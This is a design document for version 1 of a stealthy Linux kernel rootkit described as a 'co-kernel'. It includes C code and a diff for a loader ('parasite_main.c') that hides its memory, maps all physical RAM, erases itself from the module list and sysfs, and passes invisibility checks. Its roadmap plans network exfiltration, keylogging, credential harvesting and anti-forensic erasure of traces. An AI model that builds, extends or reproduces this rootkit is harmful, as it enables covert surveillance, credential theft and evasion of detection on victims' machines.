# V1 — Communication & Verification

### Shared memory channel + direct map + proof of operation · x86-64 · Linux

---

## 1. Goal

V0 proved the co-kernel runs invisibly. But we cannot verify what it does — it
just increments a private counter in hidden memory.

V1 adds three things:

1. **Direct map** — the co-kernel can read all of Linux's physical memory
2. **Shared comm page** — the co-kernel writes status/data to a page readable by Linux
3. **Verification tool** — a userspace program reads the comm page and confirms the co-kernel is alive

This is the minimum needed to build and test every future capability.

---

## 2. What Changes from V0

| Component | V0 | V1 |
|-----------|----|----|
| Co-kernel CR3 | 4 MB private + LAPIC + trampoline | + physical RAM mirror (direct map) |
| Co-kernel behavior | Increment counter | Read `init_task.comm`, write heartbeat + data to comm page |
| Shared state | None | 1 comm page (visible to both co-kernel and Linux) |
| `bootstrap_data` | `magic` only | + `init_task`, `ram_size`, `comm_page_va`, `comm_page_phys` |
| Userspace | Nothing | `ck_verify`: reads comm page via `/dev/mem` |
| Loader changes | None to `execution.c` / `stealth.c` | `pagetable.c`: map physmem · `resolve.c`: write `bootstrap_data` · `memory.c`: keep 1 page visible |

---

## 3. Technical Design

### 3.1 Direct Map — Reading Linux Memory

The loader maps all physical RAM (0 to `ram_size`) into the co-kernel's CR3 at
the same base Linux uses (`0xFFFF888000000000`), using 2 MB huge pages.

```
Co-kernel CR3 (V1 additions):
  0xFFFF888000000000 → physical 0x00000000       (2 MB huge page)
  0xFFFF888000200000 → physical 0x00200000       (2 MB huge page)
  ...
  0xFFFF88803FE00000 → physical 0x3FE00000       (last 2 MB of 1 GB)
```

After this, any Linux kernel pointer (e.g. `init_task` at `0xFFFF888XXXXXXXX`)
is directly dereferenceable from the co-kernel's address space.

**Implementation**: a loop in `pagetable.c` creates PML4 → PDP → PD entries.
Each PD entry is a 2 MB huge page (`PSE` bit set). ~30 lines.

```c
#define LINUX_DIRECT_MAP_BASE  0xFFFF888000000000UL

static int map_linux_physmem(uint64_t *pgd, unsigned long ram_size)
{
    unsigned long offset;
    for (offset = 0; offset < ram_size; offset += PMD_SIZE) {
        int ret = map_page_2m(pgd,
                              LINUX_DIRECT_MAP_BASE + offset,
                              offset,
                              PT_FLAGS_RW | PTE_PSE);
        if (ret) return ret;
    }
    return 0;
}
```

### 3.2 Shared Comm Page

The co-kernel's 4 MB allocation comes from `alloc_pages()`. In V0, **all** pages
are removed from the Linux direct map. In V1, one page is **kept visible** — the
comm page.

```
4 MB allocation (1024 pages):
  Pages 0..1022  → set_direct_map_invalid()  → invisible to Linux
  Page  1023     → KEPT in direct map         → comm page
```

The comm page has a known physical address (stored in `bootstrap_data`). A
userspace program can `mmap` it via `/dev/mem`.

```c
struct ck_comm_page {
    uint64_t magic;           /* 0x434B434F4D4D0001 ("CKCOMM\x00\x01") */
    uint64_t version;         /* protocol version: 1 */
    uint64_t tick_count;      /* incremented every PMI */
    uint64_t last_tsc;        /* rdtsc value at last tick */
    uint32_t status;          /* 0 = init, 1 = running, 2 = error */
    uint32_t data_seq;        /* incremented when data_buf changes */
    char     init_comm[16];   /* first task's .comm ("swapper/0") */
    uint8_t  data_buf[4000];  /* general-purpose data area (used in V2+) */
};
/* Total: 4056 bytes. Fits in one 4096-byte page. */
```

The **co-kernel writes** to this page on every PMI tick. **Userspace reads** it
via `/dev/mem` at any time. This is the foundation for all future verification.

### 3.3 Bootstrap Data (Loader → Co-kernel, One-Time)

```c
struct ck_bootstrap_data {
    uint64_t magic;             /* 0x434B424F4F540001 ("CKBOOT\x00\x01") */
    uint64_t init_task;         /* VA of init_task (for direct map read) */
    uint64_t ram_size;          /* total physical RAM in bytes */
    uint64_t self_phys_base;    /* physical base of co-kernel allocation */
    uint64_t direct_map_base;   /* 0xFFFF888000000000 */
    uint64_t comm_page_va;      /* VA of comm page in co-kernel CR3 */
    uint64_t comm_page_phys;    /* physical address (for userspace /dev/mem) */
};
/* 56 bytes. Written at byte 0 of the co-kernel's .data section. */
```

The loader writes this struct once. Then it erases itself. The co-kernel reads
it on the first tick and never needs the loader again.

### 3.4 Co-kernel Logic (V1)

The V1 co-kernel does exactly two things per tick:

```c
void component_tick(void)
{
    struct ck_bootstrap_data *bd = get_bootstrap_data();
    struct ck_comm_page *cp = (struct ck_comm_page *)bd->comm_page_va;

    /* 1. Heartbeat */
    cp->tick_count++;
    cp->last_tsc = __rdtsc();

    /* 2. On first tick: prove direct map works */
    if (cp->tick_count == 1) {
        cp->magic   = 0x434B434F4D4D0001ULL;
        cp->version = 1;

        /* Read init_task.comm via direct map */
        char *comm = (char *)(bd->init_task + OFFSET_TASK_COMM);
        memcpy_ck(cp->init_comm, comm, 16);

        cp->status = 1;  /* running */
    }
}
```

~20 lines of new co-kernel code. That's all.

### 3.5 Verification Tool (`ck_verify`)

A standalone C program included in the initramfs:

```c
/* tools/ck_verify.c — reads the comm page via /dev/mem */
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

struct ck_comm_page {
    uint64_t magic;
    uint64_t version;
    uint64_t tick_count;
    uint64_t last_tsc;
    uint32_t status;
    uint32_t data_seq;
    char     init_comm[16];
    uint8_t  data_buf[4000];
};

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage: ck_verify <comm_page_phys_hex> [output_file]\n");
        return 1;
    }

    uint64_t phys = strtoull(argv[1], NULL, 16);

    int fd = open("/dev/mem", O_RDONLY | O_SYNC);
    if (fd < 0) { perror("/dev/mem"); return 1; }

    void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, phys);
    if (map == MAP_FAILED) { perror("mmap"); return 1; }

    struct ck_comm_page *cp = (struct ck_comm_page *)map;

    int valid = (cp->magic == 0x434B434F4D4D0001ULL);
    printf("magic:      0x%016lx %s\n", cp->magic, valid ? "(valid)" : "(INVALID)");
    printf("version:    %lu\n", cp->version);
    printf("tick_count: %lu\n", cp->tick_count);
    printf("last_tsc:   %lu\n", cp->last_tsc);
    printf("status:     %u (%s)\n", cp->status,
           cp->status == 0 ? "init" : cp->status == 1 ? "running" : "error");
    printf("init_comm:  %.16s\n", cp->init_comm);

    /* Optional: write to file */
    if (argc > 2) {
        FILE *f = fopen(argv[2], "w");
        if (f) {
            fprintf(f, "magic=0x%016lx\n", cp->magic);
            fprintf(f, "tick_count=%lu\n", cp->tick_count);
            fprintf(f, "status=%u\n", cp->status);
            fprintf(f, "init_comm=%.16s\n", cp->init_comm);
            fclose(f);
            printf("Written to %s\n", argv[2]);
        }
    }

    munmap(map, 4096);
    close(fd);
    return valid ? 0 : 1;
}
```

---

## 4. Loader Changes from V0

### 4.1 `memory.c` — Keep Comm Page Visible

```diff
  /* Remove all pages EXCEPT the last one (comm page) */
- for (i = 0; i < nr_pages; i++)
+ for (i = 0; i < nr_pages - 1; i++)
      set_direct_map_invalid_noflush(page + i);
+ /* Page nr_pages-1 stays in Linux's direct map → comm page */
```

5 lines changed.

### 4.2 `pagetable.c` — Map Physical RAM

Add the `map_linux_physmem()` loop (section 3.1). ~30 lines.

### 4.3 `resolve.c` — Write Bootstrap Data

Resolve `init_task` via kprobes. Detect RAM size (`totalram_pages() * PAGE_SIZE`).
Compute comm page physical address (`page_to_phys(first_page + nr_pages - 1)`).
Write `ck_bootstrap_data` into co-kernel memory. ~20 lines.

### 4.4 `parasite_main.c` — Orchestration

V1 steps interleaved with existing V0 steps:

```
1.  (V0) alloc_pages — 4 MB, order 10
2.  (V1) keep last page as comm page (don't hide it)
3.  (V0) build co-kernel page tables
4.  (V1) map physmem into co-kernel page tables
5.  (V0) copy co-kernel binary into allocation
6.  (V1) resolve init_task, write bootstrap_data
7.  (V0) install IDT handler, arm PMI
8.  (V1) print comm_page_phys to dmesg (for ck_verify)
9.  (V0) erase module from module list + sysfs
```

~10 lines of additions to the existing orchestrator.

---

## 5. File Structure (V1 delta from V0)

```
Modified:
  cokernel/cokernel.c       ← heartbeat + direct map read
  module/memory.c           ← keep comm page in direct map
  module/pagetable.c        ← map physmem (2 MB pages)
  module/resolve.c          ← resolve init_task, write bootstrap_data
  module/parasite_main.c    ← orchestrate V1 steps
  include/shared.h          ← bootstrap_data struct, comm_page struct, offsets

New:
  tools/ck_verify.c         ← userspace comm page reader
  Makefile                  ← add tools/ build target
```

**Total new/changed code**: ~150 lines.

---

## 6. Verification Criteria

| ID | Test | Expected Result |
|----|------|-----------------|
| **V1-1** | V0 invisibility checks | All 6 still pass (`lsmod`, `/sys/module/`, `meminfo`, `perf stat`, `dmesg`) |
| **V1-2** | `ck_verify`: magic | `0x434B434F4D4D0001` |
| **V1-3** | `ck_verify`: tick_count | Non-zero and increasing (run twice, second > first) |
| **V1-4** | `ck_verify`: status | `1` (running) |
| **V1-5** | `ck_verify`: init_comm | `"swapper/0"` |
| **V1-6** | `ck_verify`: file output | `ck_verify <addr> /tmp/out && cat /tmp/out` shows valid data |
| **V1-7** | Stability | 10 min continuous operation, no crash |

---

## 7. What V1 Does NOT Include

| Excluded | Deferred to |
|----------|-------------|
| Process list walking (`task_struct`) | V2 |
| File reading (page cache) | V3 |
| File writing (page cache + dirty flag) | V4 |
| Network exfiltration (sk_buff injection) | V5 |
| Multi-CPU (SMP) | V6 |
| Keylogging, credential harvesting, network capture | V7 |
| Anti-forensics (`dmesg` scrub, PMU hiding, comm page removal) | V8 |
| NIC-specific driver code | Never — V5 uses Linux's networking structures |

---

## 8. Constraints

| ID | Constraint |
|----|------------|
| C-1 | **Single CPU only** (multi-CPU in V6) |
| C-2 | **50 μs per tick maximum** |
| C-3 | **No Linux kernel function calls** from co-kernel (loader can call them before erasing) |
| C-4 | **No runtime memory allocation** — all buffers pre-allocated within 4 MB |
| C-5 | **Debian 6.12.x amd64** — offsets specific to this kernel |
| C-6 | **QEMU q35 + KVM** — `-enable-kvm -cpu host -m 1024` |

---

## 9. Future Direction

V1 establishes the communication channel. Once `ck_verify` shows correct results,
the co-kernel can be extended incrementally:

- **V2** reads process state (`task_struct` list)
- **V3** reads files via page cache traversal
- **V4** writes files via page cache manipulation + dirty flag
- **V5** injects network packets via `sk_buff` / queue manipulation (any NIC)
- **V6** adds SMP (multi-CPU PMI)
- **V7** adds surveillance: keylogging, credentials, network capture
- **V8** removes all traces (comm page, dmesg, PMU counters)

Each version operates **only via direct memory manipulation during PMI** —
never by calling a Linux kernel function. The co-kernel reuses Linux's
in-memory data structures, not its code.
